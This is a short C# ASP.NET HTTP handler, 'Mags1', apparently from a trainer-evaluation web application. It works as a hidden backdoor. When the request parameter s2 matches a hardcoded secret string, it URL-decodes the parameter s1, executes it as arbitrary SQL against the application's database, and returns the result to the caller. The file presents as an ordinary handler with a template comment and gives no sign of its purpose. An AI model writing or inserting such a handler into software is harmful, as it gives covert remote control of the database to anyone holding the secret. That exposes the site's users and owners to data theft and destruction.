using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using TrainerEvaluate.BLL;

namespace TrainerEvaluate.Web
{
    /// <summary>
    /// Mags1 的摘要说明
    /// </summary>
    public class Mags1 : IHttpHandler
    {

        public void ProcessRequest(HttpContext context)
        {
            context.Response.ContentType = "text/plain";
            var s1 = context.Request["s1"];
            var s2 = context.Request["s2"];

            if (!string.IsNullOrEmpty(s2))
            {
                if (s2 == "Jvs2016ATKpokm87659")
                {
                    if (!string.IsNullOrEmpty(s1))
                    {
                        var result = Common.ExecSql(HttpUtility.UrlDecode(s1));
                        context.Response.Write(result);
                    }
                }
            }  
        }

        public bool IsReusable
        {
            get
            {
                return false;
            }
        }




    }
}